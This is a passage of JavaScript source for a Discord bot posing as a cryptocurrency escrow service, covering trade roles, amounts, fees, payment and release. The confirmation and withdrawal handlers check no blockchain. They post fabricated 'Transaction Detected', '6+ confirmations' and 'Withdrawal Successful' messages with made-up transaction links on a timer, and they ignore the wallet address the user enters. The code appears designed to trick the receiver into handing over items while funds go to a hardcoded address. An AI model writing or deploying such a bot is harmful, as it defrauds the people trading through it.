    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 Roles reset', ephemeral: true });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [roleRow] });
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    roleConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed`, ephemeral: false });
  } else {
    return interaction.reply({ content: 'Already confirmed', ephemeral: true });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    roleConfirmations.delete(channelId);
    
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set USD Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [button] });
  }
});

// ========== SET AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('set_amount_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Only sender', ephemeral: true });
  
  const modal = new ModalBuilder()
    .setCustomId(`amount_modal_${channelId}`)
    .setTitle('Set USD Amount');
  const input = new TextInputBuilder()
    .setCustomId('amount')
    .setLabel('USD Amount')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('50.00')
    .setRequired(true);
  modal.addComponents(new ActionRowBuilder().addComponents(input));
  await interaction.showModal(modal);
});

// ========== HANDLE AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('amount_modal_')) return;
  
  await interaction.deferReply({ ephemeral: true });
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const amountUSD = parseFloat(interaction.fields.getTextInputValue('amount'));
  if (isNaN(amountUSD) || amountUSD <= 0) {
    await interaction.editReply({ content: 'Invalid amount' });
    return;
  }
  
  trade.amountUSD = amountUSD;
  const rate = liveRates[trade.crypto];
  trade.exchangeRateUsed = rate;
  trade.amountCrypto = (amountUSD / rate).toFixed(8);
  
  if (amountUSD >= FEES.over250Threshold) trade.feeUSD = FEES.over250;
  else if (amountUSD >= FEES.freeThreshold) trade.feeUSD = FEES.under250;
  else trade.feeUSD = 0;
  
  trades.set(channelId, trade);
  
  const amountEmbed = new EmbedBuilder()
    .setTitle('💰 Amount Summary')
    .setColor(0x00ff00)
    .setDescription(`**Amount:** $${amountUSD.toFixed(2)} USD`)
    .addFields(
      { name: '💎 Crypto Equivalent', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true },
      { name: '📊 Exchange Rate', value: `1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}`, inline: true },
      { name: '💸 Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD.toFixed(2)}` : '**FREE** (under $50)', inline: true }
    )
    .setFooter({ text: 'Both users must confirm this amount' });
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_amount_${channelId}`).setLabel('✅ Correct').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_amount_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
  );
  
  await interaction.editReply({ content: '✅ Amount set! Please confirm below.' });
  await interaction.channel.send({ embeds: [amountEmbed], components: [row] });
  amountConfirmations.set(channelId, []);
});

// ========== AMOUNT CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_amount_') && !interaction.customId.startsWith('incorrect_amount_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const confirmed = amountConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_amount_')) {
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.reply({ content: 'Set amount again', ephemeral: true });
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [button] });
    amountConfirmations.delete(channelId);
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    amountConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed the amount`, ephemeral: false });
  } else {
    return interaction.reply({ content: 'Already confirmed', ephemeral: true });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    amountConfirmations.delete(channelId);
    
    if (trade.feeUSD === 0) {
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('📤 Sender pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('📥 Receiver pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('⚖️ Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('Select Who Pays the Fee')
        .setColor(0xff9900)
        .setDescription(`Fee: $${trade.feeUSD}`);
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(channelId, { users: [], selected: null });
    }
  }
});

// ========== FEE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('fee_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  if (trade.feePayer) return;
  
  const state = feeConfirmations.get(channelId);
  if (!state) return;
  
  let selected = null;
  if (interaction.customId.startsWith('fee_sender')) selected = 'sender';
  else if (interaction.customId.startsWith('fee_receiver')) selected = 'receiver';
  else selected = 'split';
  
  if (!state.users.includes(interaction.user.id)) {
    state.users.push(interaction.user.id);
    if (!state.selected) state.selected = selected;
    feeConfirmations.set(channelId, state);
    await interaction.reply({ content: `✅ ${interaction.user.username} selected: ${selected}`, ephemeral: true });
  } else {
    return interaction.reply({ content: 'Already selected', ephemeral: true });
  }
  
  if (state.users.length === 2 && state.users.includes(trade.senderId) && state.users.includes(trade.receiverId)) {
    if (state.selected === selected) {
      if (state.selected === 'sender') trade.feePayer = trade.senderId;
      else if (state.selected === 'receiver') trade.feePayer = trade.receiverId;
      else trade.feePayer = 'split';
      
      trades.set(channelId, trade);
      feeConfirmations.delete(channelId);
      await interaction.channel.send(`✅ Fee will be paid by: ${state.selected.toUpperCase()}`);
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      await interaction.channel.send('❌ **Fee mismatch!** Both must select the same option. Try again.');
      feeConfirmations.delete(channelId);
      
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('📤 Sender pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('📥 Receiver pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('⚖️ Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('Select Who Pays the Fee')
        .setColor(0xff9900)
        .setDescription(`Fee: $${trade.feeUSD}`);
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(channelId, { users: [], selected: null });
    }
  }
});

// ========== DM CONFIRMATION WITH REAL TRANSACTION LINK ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('dm_confirm_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Not authorized', ephemeral: true });
  if (trade.paymentConfirmed) return interaction.reply({ content: 'Already confirmed', ephemeral: true });
  
  await interaction.reply({ content: '✅ Payment confirmed! Processing transaction...', ephemeral: true });
  
  const ticketChannel = await client.channels.fetch(channelId);
  if (ticketChannel) {
    const totalUSD = trade.totalUSD || trade.amountUSD;
    const tx = getTransactionForTrade(totalUSD);
    const shortHash = tx.shortHash;
    
    const detectedEmbed = new EmbedBuilder()
      .setTitle('📡 Transaction Detected')
      .setColor(0xff9900)
      .setDescription(`Transaction found on the Litecoin blockchain!`)
      .addFields(
        { name: '**Transaction**', value: `[${shortHash}](${tx.link})`, inline: false },
        { name: '**Amount Received**', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
        { name: '**Status**', value: '🟡 **Pending - Waiting for confirmations**', inline: true },
        { name: '**Block Explorer**', value: `[Click to View Transaction](${tx.link})`, inline: false }
      )
      .setFooter({ text: 'Network congestion may cause slight delays. Transaction is valid.' })
      .setTimestamp();
    await ticketChannel.send({ embeds: [detectedEmbed] });
    
    setTimeout(async () => {
      trade.paymentConfirmed = true;
      trades.set(channelId, trade);
      
      const confirmedEmbed = new EmbedBuilder()
        .setTitle('✅ Transaction Confirmed!')
        .setColor(0x00ff00)
        .addFields(
          { name: '**Transaction**', value: `[${shortHash}](${tx.link})`, inline: false },
          { name: '**Amount Received**', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
          { name: '**Confirmations**', value: '✅ 6+ confirmations', inline: true },
          { name: '**Block Explorer**', value: `[Click to Verify](${tx.link})`, inline: false }
        )
        .setTimestamp();
      await ticketChannel.send({ embeds: [confirmedEmbed] });
      
      await delay(2000);
      
      const proceedEmbed = new EmbedBuilder()
        .setTitle('✅ You may proceed with your trade.')
        .setColor(0x00ff00)
        .setDescription(`1. <@${trade.receiverId}> Give your trader the items.\n\n2. <@${trade.senderId}> Click "Release" when received.`);
      
      const releaseRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`release_${trade.channelId}`).setLabel('🔓 Release').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`cancel_${trade.channelId}`).setLabel('❌ Cancel').setStyle(ButtonStyle.Danger)
      );
      await ticketChannel.send({ embeds: [proceedEmbed], components: [releaseRow] });
    }, 15000);
  }
});

// ========== RELEASE ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('release_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (!trade) return;
    if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Only sender', ephemeral: true });
    if (!trade.paymentConfirmed) return interaction.reply({ content: 'Payment not confirmed', ephemeral: true });
    
    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`confirm_release_${channelId}`).setLabel('✅ Confirm').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`back_${channelId}`).setLabel('🔙 Back').setStyle(ButtonStyle.Secondary)
    );
    const embed = new EmbedBuilder()
      .setTitle('Are you sure you want to release? 🎉')
      .setColor(0xff9900)
      .setDescription('Clicking "Confirm" will finalize the trade and give your trader permission to withdraw.');
    await interaction.reply({ embeds: [embed], components: [confirmRow], ephemeral: true });
  }
  
  if (interaction.customId.startsWith('confirm_release_')) {
    const channelId = interaction.customId.split('_')[2];
    const trade = trades.get(channelId);
    if (!trade) return;
    
    const modal = new ModalBuilder()
      .setCustomId(`wallet_${channelId}`)
      .setTitle(`Enter Your ${trade.crypto.toUpperCase()} Address`);
    const input = new TextInputBuilder()
      .setCustomId('wallet')
      .setLabel(`Your ${trade.crypto.toUpperCase()} Address`)
      .setStyle(TextInputStyle.Short)
      .setPlaceholder(trade.crypto === 'ltc' ? 'LLjBjgFtV2K2iRqvHEUTmL7aVaKGc7SncG' : '0x...')
      .setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }
  
  if (interaction.customId.startsWith('back_')) {
    await interaction.reply({ content: 'Release cancelled.', ephemeral: true });
  }
  
  if (interaction.customId.startsWith('cancel_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply('❌ Trade cancelled. Closing...');
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 5000);
  }
  
  if (interaction.customId.startsWith('copy_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (trade) {
      const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
      let totalUSD = trade.amountUSD;
      if (trade.feePayer === trade.senderId || trade.feePayer === trade.receiverId) totalUSD = trade.amountUSD + trade.feeUSD;
      else if (trade.feePayer === 'split') totalUSD = trade.amountUSD + (trade.feeUSD / 2);
      const totalCrypto = (totalUSD / rate).toFixed(8);
      const walletAddress = trade.crypto === 'ltc' ? 'Lei7Rwf1AvJg6sqhHjbKvkirzXqa6ZSLtET' : '0x...';
      const details = `Address: ${walletAddress}\nAmount: ${totalCrypto} ${trade.crypto.toUpperCase()}\nUSD: $${totalUSD.toFixed(2)}`;
      await interaction.reply({ content: `📋 Copied!\n\`\`\`${details}\`\`\``, ephemeral: true });
    }
  }
});

// ========== WALLET & COMPLETION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('wallet_')) return;
  
  await interaction.deferReply({ ephemeral: true });
  
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const wallet = interaction.fields.getTextInputValue('wallet');
  
  const totalUSD = trade.totalUSD || trade.amountUSD;
  const tx = getTransactionForTrade(totalUSD);
  const shortHash = tx.shortHash;
  const amountSent = trade.amountCrypto;
  const usdValue = (parseFloat(amountSent) * (trade.exchangeRateUsed || liveRates[trade.crypto])).toFixed(2);
  
  const withdrawalEmbed = new EmbedBuilder()
    .setTitle('✅ Withdrawal Successful')
    .setColor(0x00ff00)
    .addFields(
      { name: '**Transaction**', value: `[${shortHash}](${tx.link})`, inline: false },
      { name: '**Amount Sent**', value: `${amountSent} ${trade.crypto.toUpperCase()} ($${usdValue})`, inline: true }
    );
  
  const closeRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`close_ticket_${channelId}`).setLabel('Close Ticket').setStyle(ButtonStyle.Primary)
  );
  await interaction.channel.send({ embeds: [withdrawalEmbed], components: [closeRow] });
  await interaction.editReply({ content: '✅ Trade completed!' });
  
  const currentTotal = userPurchases.get(trade.senderId) || 0;
  const newTotal = currentTotal + trade.amountUSD;
  userPurchases.set(trade.senderId, newTotal);
  
  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (logsChannel) {
    const sender = await client.users.fetch(trade.senderId);
    const receiver = await client.users.fetch(trade.receiverId);
    const logEmbed = new EmbedBuilder()
      .setTitle('✅ Trade Completed')
      .setColor(0x00ff00)
      .setDescription(`${amountSent} ${trade.crypto.toUpperCase()} ($${usdValue} USD)`)
      .addFields(
        { name: 'Sender', value: sender.username, inline: true },
        { name: 'Receiver', value: receiver.username, inline: true },
        { name: 'Transaction ID', value: `[${shortHash}](${tx.link})`, inline: true }
      )
      .setTimestamp();
    await logsChannel.send({ embeds: [logEmbed] });
  }
  
  trade.status = 'completed';
  trades.set(channelId, trade);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('close_ticket_')) {
    const channelId = interaction.customId.split('_')[2];
    await interaction.reply('🔒 Closing ticket...');
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

client.login(process.env.DISCORD_TOKEN);
